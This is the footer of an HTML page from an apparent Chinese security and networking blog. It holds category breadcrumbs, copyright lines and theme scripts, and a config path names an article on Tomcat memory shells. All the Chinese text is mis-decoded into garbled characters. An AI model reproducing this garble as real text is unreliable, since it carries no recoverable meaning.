href="/categories/Program/Golang/%E5%9F%BA%E7%A1%80/" title="åˆ†ç±»äº åŸºç¡€">åŸºç¡€</a></div><span><a href="/Program/golang/%E5%85%A5%E9%97%A8/%E8%BF%90%E7%AE%97%E7%AC%A6/" title="è¿ç®—ç¬¦">è¿ç®—ç¬¦</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/" title="åˆ†ç±»äº åä¸ºé˜²ç«å¢™">åä¸ºé˜²ç«å¢™</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%AE%9E%E9%AA%8C/" title="åˆ†ç±»äº å®éªŒ">å®éªŒ</a></div><span><a href="/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%AE%9E%E9%AA%8C/%E9%98%B2%E7%81%AB%E5%A2%99NAT%E9%85%8D%E7%BD%AE/" title="é˜²ç«å¢™NATé…ç½®">é˜²ç«å¢™NATé…ç½®</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="åˆ†ç±»äº æ·±ä¿¡æœè®¾å¤‡">æ·±ä¿¡æœè®¾å¤‡</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/" title="åˆ†ç±»äº å®éªŒ">å®éªŒ</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/VPN/Sangfor%20VPN/" title="Sangfor VPN">Sangfor VPN</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PDCERF/" title="åˆ†ç±»äº åº”æ€¥å“åº”">åº”æ€¥å“åº”</a> <i class="ic i-angle-right"></i> <a href="/categories/PDCERF/%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/" title="åˆ†ç±»äº ç³»ç»ŸåŠ å›º">ç³»ç»ŸåŠ å›º</a></div><span><a href="/PDCERF/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/Linux%E5%8A%A0%E5%9B%BA/" title="LinuxåŠ å›º">LinuxåŠ å›º</a></span></li></ul></div><div><h2>æœ€æ–°è¯„è®º</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 â€“ <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">ä½™æ˜Ÿé…’ @ ä½™æ˜Ÿé…’</span></div><div class="powered-by">åŸºäº <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"APT/ä»£ç å®¡è®¡/Javaä»£ç å®¡è®¡/å®¡è®¡åŸºç¡€/Tomcatå†…å­˜é©¬/",favicon:{show:"ï¼ˆâ—Â´3ï½€â—ï¼‰ã‚„ã‚Œã‚„ã‚Œã ãœ",hide:"(Â´Ğ”ï½€)å¤§å¤‰ã ï¼"},search:{placeholder:"æ–‡ç« æœç´¢",empty:"å…³äº ã€Œ ${query} ã€ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœåˆ°",stats:"${time} ms å†…æ‰¾åˆ° ${hits} æ¡ç»“æœ"},valine:!0,fancybox:!0,copyright:'å¤åˆ¶æˆåŠŸï¼Œè½¬è½½è¯·éµå®ˆ <i class="ic i-creative-commons"></i>BY-NC-SA åè®®ã€‚',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->